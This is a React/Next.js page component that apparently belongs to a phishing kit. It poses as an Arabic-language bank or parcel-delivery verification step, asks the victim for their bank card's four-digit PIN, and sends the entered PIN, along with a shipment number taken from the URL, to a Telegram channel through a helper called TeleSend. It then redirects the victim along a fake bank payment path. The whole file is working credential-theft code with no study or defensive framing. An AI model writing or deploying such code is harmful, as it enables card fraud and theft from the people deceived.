
"use client"

import styles from './code.module.css'
import { useState } from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import TeleSned from '../../../../../../../server/TeleSend'

const Code = () => {
  const {Send} = TeleSned();

  const router = useRouter();
  const x = useSearchParams();
  const datas = x.get("names")



  const [form,setForm]=useState({
    data:{
      code:"",
      رقم_الشحنة:datas
    }
  })
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToTelegram = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)

    
  };
  const handlerout = ()=>{
    if(form.data.code == ""){
      alert('من فضلك قم بملى الحقول')
    }else{
      router.push(`/fozajil/banks/pay/code/nphad/codeto/finish?names=${datas}`)
    }
  }

  return (
    <div className={styles.contect}>
      <div>
      <h1> التحقق</h1>
      <p>يرجى ادخال الرمز السري الخاص ببطاقة الصراف والمكون من اربع ارقام</p>
     
      <form onSubmit={(e)=>{
        e.preventDefault();
        PostToTelegram()
      }}>
        <label htmlFor="">
        ادخل كلمة مرور البطاقة البنكية
        <input type="text" name="code" onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} placeholder="ادخل كلمة المرور هنا" />
        </label>
        <button type='submit' onClick={handlerout}>تحقق</button>
      </form>
      <p>هل تواجه مشكلة في تسجيل الدخول ؟ أعد الاتصال</p>
      </div>
    </div>
  )
}

export default Code



